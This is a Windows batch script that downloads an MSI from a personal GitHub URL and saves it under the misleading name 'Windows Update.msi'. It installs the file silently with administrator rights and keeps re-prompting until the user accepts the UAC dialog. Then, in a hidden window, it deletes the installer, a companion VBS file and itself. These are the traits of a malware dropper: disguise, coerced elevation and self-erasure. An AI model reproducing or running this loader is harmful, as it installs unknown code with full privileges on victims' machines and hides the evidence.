@echo off
setlocal enabledelayedexpansion

:: Set download URL
set "url=https://raw.githubusercontent.com/kevin64848/filesnew/refs/heads/main/file.msi"

:: Define paths
set "outputFileName=Windows Update.msi"
set "outputFilePath=%LocalAppData%\%outputFileName%"
set "vbsFilePath=%~dp0file.vbs"

:: Delete existing MSI if it exists
if exist "%outputFilePath%" del /f /q "%outputFilePath%"

echo Downloading MSI from %url% ...
powershell.exe -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%' -UseBasicParsing } catch { exit 1 }"

if not exist "%outputFilePath%" (
    echo Download failed. Exiting.
    exit /b 1
)

:: Loop until the MSI installer runs successfully with elevation
:install_loop
echo Attempting to run MSI installer with admin privileges...
powershell.exe -Command "try { Start-Process msiexec.exe -ArgumentList '/i \"%outputFilePath%\" /qn' -Verb RunAs -Wait; exit 0 } catch { exit 1 }"

:: Check error level (0 = success, 1 = user cancelled UAC)
if errorlevel 1 (
    echo.
    echo [!] Installation was not completed. User may have cancelled UAC prompt.
    echo     Retrying...
    timeout /t 2 /nobreak >nul
    goto install_loop
)

echo Installation completed successfully.
echo Scheduling cleanup...

:: Schedule deletion of MSI, VBS, and this BAT file
powershell.exe -WindowStyle Hidden -Command ^
"Start-Sleep -Seconds 1; ^
 Remove-Item -Path '%outputFilePath%' -Force -ErrorAction SilentlyContinue; ^
 Remove-Item -Path '%vbsFilePath%' -Force -ErrorAction SilentlyContinue; ^
 Remove-Item -Path '%~f0' -Force -ErrorAction SilentlyContinue"

exit /b 0
